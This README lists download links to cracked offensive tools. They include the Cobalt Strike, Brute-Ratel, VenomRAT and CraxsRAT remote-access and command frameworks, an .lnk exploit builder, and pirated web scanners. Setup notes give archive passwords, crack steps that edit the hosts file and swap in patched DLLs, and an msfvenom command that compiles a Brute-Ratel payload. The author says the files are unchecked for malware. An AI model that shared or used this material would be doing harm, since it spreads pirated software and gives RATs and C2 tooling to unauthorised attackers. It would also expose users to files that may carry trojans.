# ⚠️ WARNING ⚠️
As of 1/27/2024 these tools will not be checked for malware using any sort of environment, you are responsible for any damages done to your computer, run these strictly in a VM environment.<br><br>Make sure to read notes at the bottom before opening any issue.

# Cracked Red Teaming Tools.
This is a full collection of red teaming tools which have been cracked by other people, if you need me to find anything, let me know via the issues tab.
<br><br>

### C2/RATs
##### Windows - LINKS WORKING (1/27/2024)
| Tool | Link |
| :--- | ---: |
| Cobalt Strike v4.9.1 | [Download](https://pixeldrain.com/u/wqJbAybe) |
| Brute-Ratel v1.2.2 (Scandinavian Defense) | [Download](https://pixeldrain.com/u/9bh8UK5N) |
| VenomRAT v6.0.1 | [Download](https://pixeldrain.com/u/xVXeWbWb) |

##### Android - LINKS WORKING (1/27/2024)
| Tool | Link |
| :--- | ---: |
| CraxsRAT v6? (⚠️ **READ NOTES** ⚠️) | [Download](https://pixeldrain.com/u/e3MdYXM7) |
| ~~SpyNote v6.4~~ | SpyNote is outdated, wait for SpyNote X cracks to surface or use the tool above. |

<br><br>
### Exploitation Toolkits/Software - LINKS WORKING (1/27/2024)
###### Windows
| Tool | Link |
| :--- | ---: |
| Immunity CANVAS v7.27 | [Download](https://pixeldrain.com/u/u8SeCmNe) |
| Quantum .lnk Exploit Builder (02-10-22) | [Download](https://pixeldrain.com/u/9zjpYNQn) |
| JexBot v1.0 (READ NOTES) | [Download](https://pixeldrain.com/u/Ea8kF2Hh) |

<br><br>
### Web App Security Tools - LINKS WORKING (1/27/2024)
##### Windows
| Tool | Link |
| :--- | ---: |
| Invicti Pro v24.1 | [Download](https://pixeldrain.com/u/DxDbY42C) |
| Burp Suite PRO v2023.6.1 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/burpsuite_installer_windows.bat)) | [Download](https://pixeldrain.com/u/wWaQzSmC) |
| Acunetix Scanner v24.1 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/acunetix_installer_windows.bat)) | [Download](https://pixeldrain.com/u/g6YZc6y1) |
| Xray Pro v1.9.10 | [Download](https://pixeldrain.com/u/JMYNm434) |
| HCL AppScan Standard v10.4.0 | [Download](https://pixeldrain.com/u/3CWfWbHL) |

##### Linux
| Tool | Link |
| :--- | ---: |
| Acunetix Scanner v24.1 | [Download](https://pixeldrain.com/u/29uGRi6d) |
| Xray Pro v1.9.11 | [Download](https://pixeldrain.com/u/aFiuwBWs) |

<br><br>
# Notes
###### General
Most of these tools are obtained from [CyberArsenal](https://cyberarsenal.org/) and [xss.is](https://xss.is/), credits for the cracks go to them.<br><br>If an archive asks for a password, try `pwn3rzs`, `Pwn3rzs`, `xss.is`, `XSS.IS` or `exploit.in`

###### Cobalt Strike
Cobalt Strike **requires you** to deploy the teamserver on a Linux install such as Ubuntu, or whatever distro of your choice.<br>In order to run the Cobalt Strike client on your Windows install, you will have to run the following command:<br>`java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike-client.jar`.

On Linux, you can simply run `start.sh`.

###### Brute-Ratel
I am not sure whether or not this version of Brute-Ratel works properly, it has not been tested at all, however from the few basic functions *I am assuming it works*. If it does not, someone let me know.

If Brute-Ratel fails to compile the badger.bin into a badger.exe you can use the following to manually compile it: `cat badger.bin | msfvenom -p - -f exe --platform win -a x64 -o badger.exe`

###### CraxsRat
This version of CraxsRAT appears to be quite unstable when it comes to connections, if someone wants me to, I can attempt to find a newer version of this rat.

###### Immunity CANVAS
Immunity CANVAS contains the following: `D2 Exploitation Pack v2.55` & `White Phosphorus v1.28`.

###### HCL AppScan
Upon installing AppScan make sure to **replace the installed DLLs with the cracked ones**.

###### JexBot v1.0
1. Run add_hosts.bat as administrator, if you get an "Access Denied" error, open "C:\Windows\System32\drivers\etc\hosts" and add the following:
```
127.0.0.1 jex.tools
127.0.0.1 www.jex.tools
```
2. Run "Jex_crack.exe" and then open "JEX BOT.exe"
3. Put `mastercho` as the username and password and press login.
Note: After logging into the JexBot, you may close "Jex_crack.exe", however you will have to re-open "Jex_crack.exe" every time you want to open the JexBot.

###### Craxs RAT v6?
I am not sure if this is malware, as it is a remake of crax I've found on the xss.is forums going under "Anonymous V6", and it was also leaked according to OP.<br>Archive password: `suspicious`

Run strictly in a VM environment.
